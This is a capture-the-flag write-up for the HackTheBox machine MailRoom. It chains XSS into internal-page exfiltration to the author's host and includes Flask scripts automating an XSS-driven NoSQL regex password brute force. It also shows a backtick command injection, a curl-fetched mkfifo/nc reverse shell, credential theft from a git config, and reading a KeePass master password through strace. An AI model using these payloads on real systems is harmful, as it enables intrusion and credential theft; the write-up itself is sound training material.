---
layout: post
title: HTB MailRoom
cover-img: /assets/covers/mailroom.png
excerpt_separator: <!--more-->
tags: [HTB, HackTheBox, Linux, JavaScript, XSS, Git, NoSQL injection, KeePass]
comments: true
---
MailRoom is a hard difficulty Linux machine realeased on HackTheBox.
<!--more-->
## Recon
Nmap shows ports 22 nad 80 open:
```
❯ nmap -p- -sC -oN mailroom.nmap 10.10.11.209
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-16 09:53 CEST
Nmap scan report for 10.10.11.209
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA)
|   256 821beb758b9630cf946e7957d9ddeca7 (ECDSA)
|_  256 19fb45feb9e4275de5bbf35497dd68cf (ED25519)
80/tcp open  http
|_http-title: The Mail Room

Nmap done: 1 IP address (1 host up) scanned in 19.76 seconds
```

## Website
The website offers shipping services. In the footer, it reveals a domain name:

![Web](/assets/screenshots/htb-mailroom/web.png)

![Domain](/assets/screenshots/htb-mailroom/domain.png)

I will add the domain name to my `/etc/hosts` file and move on. I can determine that th website is using PHP by looking at the response headers:
```bash
curl mailroom.htb -vvv
...
< X-Powered-By: PHP/7.4.33
...
```
The website has a contact form and a disclaimer that says an AI will automatically read the inquiry message:

![Contact](/assets/screenshots/htb-mailroom/contact.png)

When i submit the form, the site creates an HTML file and then provides a link to it. The values user puts are then reflected in this file. This looks potentially vulnerable to XSS, so i will create a test payload:

![XSS_test](/assets/screenshots/htb-mailroom/xss_form.png)

And when i click the link i get an alert, meaning the XSS is susccesfull:

![XSS_succ](/assets/screenshots/htb-mailroom/xss_alert.png)

If the site contained a login functionality i could use this to steal the cookie of the "AI" reading the message, but since the website looks static otherwise, i can't really exploit this vulnerability for now.

I ran gobuster to scan for files or directiores, but nothing new was found. I will comeback to the domain name now, running a VHOST discovery brute force. Using ffuf, a new subdomain is revealed, called `git`:
```
❯ ffuf -H "Host: FUZZ.mailroom.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://mailroom.htb -fs 7748                                                        10:04:11

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://mailroom.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.mailroom.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 7748
________________________________________________

[Status: 200, Size: 13201, Words: 1009, Lines: 268, Duration: 49ms]
    * FUZZ: git

:: Progress: [100000/100000] :: Job [1/1] :: 793 req/sec :: Duration: [0:03:19] :: Errors: 0 ::
```
## Gitea

Somehwat unsuprisngly, the `git` subdomain is a (Gitea)[https://docs.gitea.io/en-us/] instance. Gitea is basically a self-hosted git server. This instance contains a public repository, `matthew/staffroom`:

![gitea_staffroom](/assets/screenshots/htb-mailroom/gitea_staffroom.png)

Looking at the the files in this git repo, it seems to be another php website. In one of the files, `auth.php`, it leaks domain name:
```php
 // Send an email to the user with the 2FA token
        $to = $user['email'];
        $subject = '2FA Token';
        $message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token;
        mail($to, $subject, $message);
```

However, when i try to access the website  i get 403 Forbidden error:

![Forbidden](/assets/screenshots/htb-mailroom/forb.png)

There is nothing that would casue this in the source files, so i suspect the Apache server is configured to only allow requests from certain IPs, like 127.0.0.1 or other local addresses,  and deny all others, which would make sense if this website in intended to be used only by staff.

But, maybe i can utilize the previosul discovered XSS to bypass this? I imagine the attack will look like this:

1. Use the XSS to make a request to http://staff-review-panel.mailroom.htb and save the result.
2. Make a request that contains the response to my webserver.

After trying out a few paylaods and failing, i found one that works:
```js
<script>
async function y()
{
    var x = await fetch("http://staff-review-panel.mailroom.htb/");
    var z = await fetch("http://10.10.14.52:8000/recieve/"+btoa(await x.text()));
}
y();
</script>
```
This is very simple script that base64 encodes the recieved html and makes a request to the webserver that i control. I start a webserver and send this payyload in the contact form. And i recieve a response!:

```
❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.209 - - [16/Apr/2023 12:13:44] code 404, message File not found
10.10.11.209 - - [16/Apr/2023 12:13:44] "GET /CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5<more base64>
```

I can decode the base64 and see that it is an HTML page:
```
echo 'CjwhRE9DVFlQRSBodG1sPgo8a<base64>' | base64 -d                  
                                                                                                        
<!DOCTYPE html>                                                                                                   
<html lang="en">                                                                                                  
                                                                                                                  
<head>                                           
  <meta charset="utf-8" />         
  <meta name="viewport" conte
...more html...
```
This approach seems to work. A few things to consider now:

1. This approach creates very long URLs. Some webserver set a limit to how long an URL might be, but this doesn't seem to be an issue since i control the recieving webserver.
2. This is very time consuming to do manually. I need to find a way to automate this.
3. I might need to make a POST request, which will need a different payload.

So, i created a python webserver using Flask:
```python
# Flask webserver to forward requests to http://staff-review-panel.mailroom.htb/ using XSS on http://mailroom.htb/
from flask import Flask, render_template_string, request
from urllib.parse import urlencode
import requests
import base64
from time import sleep
import json
import os, binascii

BASE_URL = "http://mailroom.htb/"
STAFF_URL = "http://staff-review-panel.mailroom.htb"
IP = "10.10.14.52"
PORT = 8888

app = Flask(__name__)

# cache
pages = {}

def make_request(path,post, post_data=None, page_id=None):
    data = {
        "email": "",
        "title": "",
    }
    if post:
        data["message"] =  f"<script>async function y(){{var x = await fetch('{{STAFF_URL}}/{{path}}',{{method:'POST', headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},body:'{{urlencode(post_data)}}'}});await fetch('http://{{IP}}:{{PORT}}/recieve', {{method:'POST',body:await JSON.stringify({{'html':btoa(await x.text()),'page':'{{page_id}}'}})}});}}y();</script>"
    else:
        data["message"] = f"<script>async function y(){{var x = await fetch('{{STAFF_URL}}/{{path}}');await fetch('http://{{IP}}:{{PORT}}/recieve', {{method:'POST',body:await JSON.stringify({{'html':btoa(await x.text()),'page':'{{path}}'}})}});}}y();</script>"
    res = requests.post(BASE_URL + "/contact.php",data=data)
    return res.status_code == 200

@app.route("/recieve", methods= ["POST"])
def recieve():
    # recieve the request made by XSS and save the HTML to pages dict
    if request.method == "POST":
        raw_json = request.data.decode()
        json_data = json.loads(raw_json)
        page = json_data["page"]
        html = json_data["html"]
        pages[page] = html
        return "Thank you"

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods = ["GET", "POST"])
def catch_all(path):
    if request.method == "GET":
        # if path not seen before, do the XSS to get the HTML
        if pages.get(path) is None:
            make_request(path,False)
        # wait for the HTML to get cached
        while not pages.get(path):
            sleep(1)
        # decode and render the html
        b64 = pages[path]
        html = base64.b64decode(b64).decode()
        return render_template_string(html)
    else:
        response_id = binascii.b2a_hex(os.urandom(12)).decode()
        make_request(path,True, request.form, response_id)
        while not pages.get(response_id):
            sleep(1)
        b64 = pages[response_id]
        html = base64.b64decode(b64).decode()
        return render_template_string(html)

app.run("0.0.0.0",port=PORT,debug=True)
```
It is a bit more complicated than i expected, but it works like this:

- GET requests to any path performs the XSS vulnerability, and sends resposne to `/recieve` endpoint. This endpoint decodes the base64 and saves the HTML in `pages` variable. Before every request, Flask checks the pages dictionary in case it already contains the HTML, so it doesnt have to perform the XSS again. 
- POST requests can change their response according to user input. That means i can't really cache them the same way as GET requests, so i just assign them unique id.

This script is farm from perfect, but it gets the job done. When i run it, and view http://localhost:8888, i can see a login form:

![Login](/assets/screenshots/htb-mailroom/login.png)

I think the CSS may not be loading correctly but thats fine. The site doesn't allow registering new users, but i knew that already since i have access to the source code. Now taking a closer look at `auth.php`, which takes care of user login, i can see it is using MongoDB:
```php
session_start(); // Start a session
$client = new MongoDB\Client("mongodb://mongodb:27017"); // Connect to the MongoDB database
header('Content-Type: application/json');
```
MongoDB is NoSQL database, and these databases can be vulnerable to a type confusion attack, where instead of:
```
password=test
```
an attacker can send a payload like this:
```
password[$ne]=test
```
If an application is vulnerable to this attack, it will interpret the malicious payload as to select records that have the attribute `password` set to value other than `test`. More information and example payloads can be found [here](https://book.hacktricks.xyz/pentesting-web/nosql-injection).

In the case of this application, it seems to prevent this attack by checking if the parametrs are string:
```php
// Verify the parameters are valid
if (!is_string($_POST['email']) || !is_string($_POST['password'])) {
    header('HTTP/1.1 401 Unauthorized');
    echo json_encode(['success' => false, 'message' => 'Invalid input detected']);
}
```
The issue here is that it only sets the header and echoes an error message, but it doesn't call `exit()`, so the application will then query the database with attacker provided, unsanitized input:
```php
// Check if the email and password are correct
$user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);
```
After that, the databse stores an 2FA token, and sends an email containing the token to the same email as provided:
```php
  if ($user) {
    // Generate a random UUID for the 2FA token
    $token = bin2hex(random_bytes(16));
    $now = time();

    // Update the user record in the database with the 2FA token if not already sent in the last minute
    $user = $collection->findOne(['_id' => $user['_id']]);
    if(($user['2fa_token'] && ($now - $user['token_creation']) > 60) || !$user['2fa_token']) {
        $collection->updateOne(
          ['_id' => $user['_id']],
          ['$set' => ['2fa_token' => $token, 'token_creation' => $now]]
        );

        // Send an email to the user with the 2FA token
        $to = $user['email'];
        $subject = '2FA Token';
        $message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token;
        mail($to, $subject, $message);
    }
    // Return a JSON response notifying about 2fa
    echo json_encode(['success' => true, 'message' => 'Check your inbox for an email with your 2FA token']);
    exit;

  } else {
    // Return a JSON error response
    header('HTTP/1.1 401 Unauthorized');
    echo json_encode(['success' => false, 'message' => 'Invalid email or password']);
  }
```
So, one of the attack paths could be to provide it with an email address that i control and intercept the 2FA token. But this won't work, because the email address needs to be present in the database, and that means that i can't access it.

Therfore to move forward i need an valid email address. Gitea provides a list of usernames:

![Users](/assets/screenshots/htb-mailroom/users.png)

So, i know 3 usernames. I also know the domain, so i can try 3 diffrent emails:

- administrator@mailroom.htb
- tristan@mailroom.htb
- matthew@mailroom.htb

I am going to use BurpSuite to test out if some of these emails are valid. The payload is going to look like this
```
email=administrator@mailroom.htb&password[$ne]=test
```
And in Burp, i can see this email is not valid:

![Burp-Invalid](/assets/screenshots/htb-mailroom/burp_username.png)

Trying out *matthew@mailroom.htb* returns the same error message, but with *tristan@mailroom.htb* i get a success message:

![Burp-valid](/assets/screenshots/htb-mailroom/burp_valid.png)

Ok so now i have a valid email, but what next? I can't get the 2FA token sicne i can't access the mail. I can try brute forcing the password for tristan. In the previous examples, `$ne` is an operator that tells the vulnerable MongoDB to match passwords not equal to 'test'. I can use different operator [$regex](https://www.mongodb.com/docs/manual/reference/operator/query/regex/), that will match a regular expression pattern. Using that, i could brute force the password. I need to see if that will work first. I am going to send a pattern that matches all passwords:

![Burp-regex-valid](/assets/screenshots/htb-mailroom/burp_regex_valid.png)

Now when i try a pattern that won't match any password i get an error message, which means this attack can succeed:

![Burp-regex-invalid](/assets/screenshots/htb-mailroom/burp_regex_invalid.png)

Now, unfortunately i spent a lot of time trying to make this work, but i didn't succeed, becasue when i was sending a lot of requests to the web it jsut stopped responding back. Therfore, i decided to choose a different approach, where i would let the XSSS perform the brute force. To explain what i mean by that, will show the payload:
```javascript
const alphabet = '0123456789abcdefghijklmnopqrstuvwxyz';
const brute = async () => { for (var i = 0; i < alphabet.length; i++){
    const currentChar = alphabet[i];
    fetch('http://staff-review-panel.mailroom.htb/auth.php',{method:'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'},body:'email=tristan@mailroom.htb&password[$regex]=^{password}'+ alphabet[i] +'.*'}).
    then( response => response.text()).
    then(json => {
        if (json.includes('2FA')){
            fetch('http://{RECIEVE_IP}:{RECIEVE_PORT}/recieve?password={password}'+currentChar) }})}}
brute();
```
So the above JavaScript works like this:

- Store alllowed characters in the `alphabet` varible. I might need to extend the alphabet later.
- Iterate over each chracter in alphabet and make a POST request to http://staff-review-panel.mailroom.htb/auth.php.
- Send the following payload in each POST request : `email=tristan@mailroom.htb&password[$regex]=^{password}'+ alphabet[i] +'.*'`. I already know the email, and for the password i will use the $regex operator. The `{password}` is will be the part of password i already know. So the regex pattern will look like this *^a.\**, *^b.\** and so on. The `^` chracter is improtant, because it makes the regex match the start of string and the `.*` means match everything.
- When the regex pattern matches the stored password, the response from the webapp contains the word "2FA" (You can see that in the above screenshot from Burp), and the script will then connect back to my local server showing the password in the GET request.

Now i just need to create a server that is going to recieve the requests. To do that, i wrote a python webserver in Flask:
```python
import requests
from flask import Flask,request
import string
from urllib.parse import quote

BASE_URL = "http://mailroom.htb"
STAFF_URL = "http://staff-review-panel.mailroom.htb"
RECIEVE_IP = "10.10.14.198"
RECIEVE_PORT = 5000
ALPHABET = string.digits + string.ascii_letters + "@#_-!"

password = ""

def make_request(password):
    data = {
        "email": "",
        "title": "",
    }
    data["message"] =  f"<script>const alphabet = '{{ALPHABET}}';const brute = async () => {{ for (var i = 0; i < alphabet.length; i++){{ const currentChar = alphabet[i]; fetch('{{STAFF_URL}}/auth.php',{{method:'POST', headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},body:'email=tristan@mailroom.htb&password[$regex]=^{{quote(password)}}'+ alphabet[i] +'.*'}}).then( response => response.text()).then(json => {{ if (json.includes('2FA')){{ fetch('http://{{RECIEVE_IP}}:{{RECIEVE_PORT}}/recieve?password={{password}}'+currentChar) }}}})}}}};brute();</script>"  

    requests.post(BASE_URL + "/contact.php",data=data)

app = Flask(__name__)

@app.route("/recieve", methods=["GET"])
def recieve():
    global password
    password = request.args.get("password")
    make_request(password)
    return "Thank you!"

@app.route("/start")
def start():
    make_request("")
    return "Brute force started!"

@app.route("/restart")
def restart():
    make_request(password)
    return f"Brute force restarted! with password: {password}"

app.run("0.0.0.0")
```
To start the brute-force, i need to make a GET request to the **/start** endpoint, which calls the **make_request** function with empty string.This function performs the actual brute forcing, and sends the result to **/recieve** endpoint. And when the **/recieve** endpoint recieves a request, it stores the password value in global variable and again calls **make_request**, this time with the recovered password. I also created a **/restart** endpoint, that basically jsut resends the request with current password. I did dthis becasue the server is not very stable and it might drop requests.

Sidenote: As it turns out, the password contains a special, non aplha-numeric character. This is tricky because lot of these characters, like `?,*,.` are part of regex syntax and they would break the query. Thankfully the character is safe, so i don't have to worry about it.

I run the exploit, and i have to restart it a few times, buti t seems like i got the password:
```
❯ python3 password_brute.py                                                                                                                                                                   19:03:08
 * Serving Flask app 'password_brute'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
 * Running on http://192.168.236.140:5000
Press CTRL+C to quit
127.0.0.1 - - [18/Apr/2023 19:03:17] "GET /start HTTP/1.1" 200 -
10.10.11.209 - - [18/Apr/2023 19:03:20] "GET /recieve?password=6 HTTP/1.1" 200 -
10.10.11.209 - - [18/Apr/2023 19:03:28] "GET /recieve?password=69 HTTP/1.1" 200 -
10.10.11.209 - - [18/Apr/2023 19:03:38] "GET /recieve?password=69t HTTP/1.1" 200 -
10.10.11.209 - - [18/Apr/2023 19:03:46] "GET /recieve?password=69tr HTTP/1.1" 200 -
10.10.11.209 - - [18/Apr/2023 19:03:55] "GET /recieve?password=69tri HTTP/1.1" 200 -
10.10.11.209 - - [18/Apr/2023 19:04:04] "GET /recieve?password=69tris HTTP/1.1" 200 -
127.0.0.1 - - [18/Apr/2023 19:05:10] "GET /restart HTTP/1.1" 200 -
127.0.0.1 - - [18/Apr/2023 19:05:45] "GET /restart HTTP/1.1" 200 -
10.10.11.209 - - [18/Apr/2023 19:05:48] "GET /recieve?password=69trisR HTTP/1.1" 200 -
10.10.11.209 - - [18/Apr/2023 19:05:54] "GET /recieve?password=69trisRu HTTP/1.1" 200 -
127.0.0.1 - - [18/Apr/2023 19:07:21] "GET /restart HTTP/1.1" 200 -
127.0.0.1 - - [18/Apr/2023 19:08:21] "GET /restart HTTP/1.1" 200 -
10.10.11.209 - - [18/Apr/2023 19:08:24] "GET /recieve?password=69trisRul HTTP/1.1" 200 -
127.0.0.1 - - [18/Apr/2023 19:09:33] "GET /restart HTTP/1.1" 200 -
127.0.0.1 - - [18/Apr/2023 19:10:04] "GET /restart HTTP/1.1" 200 -
10.10.11.209 - - [18/Apr/2023 19:10:07] "GET /recieve?password=69trisRule HTTP/1.1" 200 -
10.10.11.209 - - [18/Apr/2023 19:10:13] "GET /recieve?password=69trisRulez HTTP/1.1" 200 -
10.10.11.209 - - [18/Apr/2023 19:10:22] "GET /recieve?password=69trisRulez! HTTP/1.1" 200 -
127.0.0.1 - - [18/Apr/2023 19:13:46] "GET /restart HTTP/1.1" 200 -
127.0.0.1 - - [18/Apr/2023 19:15:44] "GET /restart HTTP/1.1" 200 -
127.0.0.1 - - [18/Apr/2023 19:16:17] "GET /restart HTTP/1.1" 200 -
```
So, it seems like `69trisRulez!` is the final password. First thing that comes to mind is trying to login via SSH. I can guess the username is `tristan`. I attemp the SSSH login, and it works!
```
❯ ssh tristan@mailroom.htb
tristan@mailroom.htb's password:
...
You have mail.
Last login: Tue Apr 18 17:01:10 2023 from 10.10.14.198
tristan@mailroom:~$
```
## Privilege escalation
Once i am logged in, i see there is another user, `matthew`:
```
ls /home/
matthew  tristan
```
And the user flag is in his home directory, so i need to gain access to his account:
```
ls /home/matthew/
personal.kdbx  user.txt
```
### matthew user

When i logged in with SSH, i recivied a notification that i have mail. Looking at the `/var/mail/tristan` file, it is the mail containing the 2FA token, as expected:
```
cat /var/mail/tristan 
Return-Path: <noreply@mailroom.htb>
X-Original-To: tristan@mailroom.htb
Delivered-To: tristan@mailroom.htb
Received: from localhost (unknown [172.19.0.5])
        by mailroom.localdomain (Postfix) with SMTP id 54560DA7
        for <tristan@mailroom.htb>; Tue, 18 Apr 2023 17:09:45 +0000 (UTC)
Subject: 2FA

Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=61c086997707dc80f4eaf613f986b966
```
So i can use the full funcionality of the website now. But is there something i can exploit? In the `inspect.php` file, there is very suspicious code:
```php
if (isset($_POST['inquiry_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
```
and:
```php
if (isset($_POST['status_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['status_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
```
Calling `shell_exec` on suer provided input is bad, but it has a filter that replaces most bad chracters with empty string. I will get back to this later.

For now, let's try to access the website. Now that i have access to the machine, i can create a reverse tunnel. To do taht, i am going to use [chisel](https://github.com/jpillora/chisel). Creating a reverse tunnel with chisel is quite simple. First on my localhost (attacker machine) i will create a listener server:
```
./chisel server -p 8000 --reverse
```

And on the remote machine (target) i will connect to the server with a client:
```
./chisel client  10.10.14.198:8000 R:8888:staff-review-panel.mailroom.htb:80
```

This tunnel is going to redirect every request i make on my localhost on port 8888 to http://staff-review-panel.mailroom.htb:80. Actually, since the subdomain and main domain are on the same port, Accessing http://localhost:8888 would redirect me to http://mailroom.htb. To solve that, i am going to add an entry to my `/etc/hosts` file:
```
127.0.0.1       localhost staff-review-panel.mailroom.htb
```

Now, when i access http://staff-review-panel.mailroom.htb:8888/, it will be redirected to 127.0.0.1, but since it has the correct 'Host' header, i can access the website:

![staff_panel](/assets/screenshots/htb-mailroom/staff_panel.png)

To login, i am going to use the email and password i got in the last stepts, and then read the 2FA token from `/var/mail/tristan`. And now i can access the inspect page:

![inspect](/assets/screenshots/htb-mailroom/inspect.png)

Now i have access to the vulnerable code, just need to exploit it. As it often happens with these blacklist filters, it is missing a character. This character is  backtick, `` ` ``. In bash, a code within backticks is executed and it's output returned. If this works, it would a blind code execution, since the original command in going to error out. I tried using ping to test out the RCE, but i didn't work. However, when i use curl, i get a connection back:

![RCE](/assets/screenshots/htb-mailroom/RCE.png)

```
 ❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.209 - - [19/Apr/2023 08:15:07] "GET / HTTP/1.1" 200 -
```

Now, to get a reverse shell, i need to use a payload without any of the banned characters. But i know curl works, so i can just write a revershe shell to a file:
```
❯ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.198 9999 >/tmp/f' > rev
```

Then download the file using curl. It is important to save it to a writable directory for all users, like `/tmp`:

![rev](/assets/screenshots/htb-mailroom/rev_shell.png)

I start a netcat listener on my machine, execute the payload like this:

![rev2](/assets/screenshots/htb-mailroom/rev_shell2.png)

And i get a connection back on my listener:
```
❯ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.198] from (UNKNOWN) [10.10.11.209] 37880
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Judging by the hostname, this seems like a Docker container:
```
$ hostname
7a6151ad8a3c
```

I am the `www-data` user, and it seems like tehre are no other users. Looking at the `/var/www` folder, i can see this contains the source code for the web applications:
```
ls /var/www
html
mailroom
staffroom
```

I know that staffroom is a git repository, and when i get config for that directory, it shows password for matthe:
```
$ git config -l
core.repositoryformatversion=0
core.filemode=true
core.bare=false
core.logallrefupdates=true
remote.origin.url=http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
remote.origin.fetch=+refs/heads/*:refs/remotes/origin/*
branch.main.remote=origin
branch.main.merge=refs/heads/main
user.email=matthew@mailroom.htb
```

The *remote.origin.url* shows the credentials `matthew:HueLover83#` (URL decoded). Using this password, i can `su` to matthew:
```
tristan@mailroom:/dev/shm$ su matthew
Password: 
matthew@mailroom:/dev/shm$ 
```

And get the user flag:
```
$ cat user.txt 
94970a8b194b****
```

### Root
There is an interesting file in matthew's home directory:
```
$ ls -la personal.kdbx 
-rw-r--r-- 1 matthew matthew 1998 Mar 16 22:47 personal.kdbx
```

It is a [KeePass](https://www.google.com/search?client=firefox-b-e&q=keepass) password database:
```
$ file personal.kdbx 
personal.kdbx: Keepass password database 2.x KDBX
```
KeePass is a password manager. I can interact with it using `kpcli` command line tool:
```
$ kpcli --kdb personal.kdbx 
Please provide the master password: *************************
Couldn't load the file personal.kdbx: The database key appears invalid or else the database is corrupt.
```

I tried cracking the password using `keepass2john` and `hashcat`, but no luck. 

While further enumerating the machine, i ran [pspy](https://github.com/DominicBreuker/pspy), to see running processes. There is a `kpcli` process running every 30 seconds:
```
2023/04/19 13:15:03 CMD: UID=1001  PID=177533 | /usr/bin/perl /usr/bin/kpcli 
2023/04/19 13:15:34 CMD: UID=1001  PID=178319 | /usr/bin/perl /usr/bin/kpcli
```

Interestingly, this process has the UID of matthew. This means that i can dump its memory, or look at syscalls it makes. Looking at the memory dump didn;t show much.

To monitor the syscalls, i am going to use `strace`. From my observations, the process runs for about ~10 seconds. I need the PID of the process for strace to track it. I am going to split my pane in tmux, in the upper part i am going to run this command:
```
watch -n 'ps aux'
```
and in the bottom part, im going to have a strace command ready, waiting fot he pid:

![tmux](/assets/screenshots/htb-mailroom/tmux_process.png)

The output is flooded with useless syscalls, so im going to filter only for read and write syscalls:
```
strace -e trace=read, write -p PID
```

Now, the output is a lot cleanear. This call caught my eye:
```
read(5, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998      
write(1, "Please provide the master passwo"..., 36) = 36  
```

It is asking for the master password, and is followed by lot of read calls:
```
read(0, "!", 8192)                      = 1                                                                       
write(1, "*", 1)                        = 1
read(0, "s", 8192)                      = 1   
write(1, "*", 1)                        = 1                                                                       
read(0, "E", 8192)                      = 1                                                                       
write(1, "*", 1)                        = 1                                                                       
read(0, 0x56425c0251c0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)                            
read(0, "c", 8192)                      = 1                                                                       
write(1, "*", 1)                        = 1                                                                       
read(0, 0x56425c0251c0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x56425c0251c0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "U", 8192)                      = 1                                                                       
write(1, "*", 1)                        = 1                                                                       
read(0, 0x56425c0251c0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x56425c0251c0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "r", 8192)                      = 1                                                                       
write(1, "*", 1)                        = 1                                                                       
read(0, 0x56425c0251c0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)                            
read(0, 0x56425c0251c0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)                            
read(0, "3", 8192)                      = 1                                                                       
write(1, "*", 1)                        = 1  
```

Looking at this, a i see a string `!sEcUr3`. This seems like it could be the master password. Following the read calls to the end, i get the following sequence:
```
!sEcUr3p4$$w01\10rd9
```

Ok, this seems like leet version of 'securepassword9'. But there is some weird character, `\10`. If i choose to ignore it, i get the following string:
```
!sEcUr3p4$$w01rd9
```
I am going to try to use this to unluck the KeePass database, but it doesn't work. The `1` seems out of place, so by trying:
```
!sEcUr3p4$$w0rd9
```
I can now unlock the KeePass database and see the stored passwords! The most interesting password is the one for root acc:
```
kpcli:/> open personal.kdbx 
Please provide the master password: *************************
kpcli:/> ls
=== Groups ===
Root/
kpcli:/> ls Root/
=== Entries ===
0. food account                                            door.dash.local
1. GItea Admin account                                    git.mailroom.htb
2. gitea database password                                                
3. My Gitea Account                                       git.mailroom.htb
4. root acc                                                               
kpcli:/> show -f 4

Title: root acc
Uname: root
 Pass: a$gBa3!GA8
  URL: 
Notes: root account for sysadmin jobs
```

I can use this password to login as root and get the root flag.
```
$ su root
Password: 
root@mailroom:/home/matthew# cd /root/
root@mailroom:~# cat root.txt 
65dd6436*********
```